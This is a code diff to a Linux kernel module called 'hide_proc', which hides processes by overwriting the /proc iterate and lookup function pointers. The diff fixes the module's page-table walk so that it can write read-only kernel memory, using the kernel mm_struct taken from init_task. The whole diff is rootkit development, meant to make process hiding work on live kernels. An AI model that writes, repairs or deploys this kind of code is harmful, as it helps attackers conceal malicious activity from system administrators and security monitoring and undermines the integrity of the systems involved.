@@ -15,6 +15,7 @@
 #include <linux/dcache.h>
 #include <asm/pgtable.h>
 #include <asm/tlbflush.h>
+#include <linux/sched/init.h> // For init_task
 
 // --- PID list management (copied from original) ---
 struct hidden_pid_entry {
@@ -91,6 +92,8 @@ void clear_hidden_pids(void) {
 
 // --- New implementation using function pointer overwrite ---
 
+static struct mm_struct *kernel_mm = NULL;
+
 // Pointers to store the original functions
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
 static int (*original_iterate)(struct file *, struct dir_context *);
@@ -147,8 +150,6 @@ static int hooked_iterate(struct file *file, struct dir_context *ctx)
 // Legacy version for older kernels
 static int hooked_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
-    // This implementation is more complex and left as an exercise
-    // For this project, we focus on modern kernels.
     return original_iterate(file, dirent, filldir);
 }
 #endif
@@ -183,14 +184,16 @@ static struct dentry * hooked_lookup(struct inode *dir, struct dentry *dentry, u
 
 // --- Init and Exit functions ---
 
-static pte_t *get_pte_from_address(unsigned long addr)
+static pte_t *get_pte_from_address(struct mm_struct *mm, unsigned long addr)
 {
     pgd_t *pgd;
     p4d_t *p4d;
     pud_t *pud;
     pmd_t *pmd;
 
-    pgd = pgd_offset_k(addr);
+    if (!mm) return NULL;
+
+    pgd = pgd_offset(mm, addr);
     if (pgd_none(*pgd) || pgd_bad(*pgd))
         return NULL;
 
@@ -217,7 +220,7 @@ static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
     pte_t *pte;
     unsigned long address = (unsigned long)addr;
 
-    pte = get_pte_from_address(address);
+    pte = get_pte_from_address(kernel_mm, address);
     if (!pte) {
         printk(KERN_ERR "[hide_proc] Failed to get PTE for address %p\n", addr);
         return -EFAULT;
@@ -246,6 +249,12 @@ int hide_proc_init(void) {
     int ret;
 
     printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");
+
+    kernel_mm = init_task.active_mm;
+    if (!kernel_mm) {
+        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from init_task.\n");
+        return -EFAULT;
+    }
 
     ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
     if (ret) {
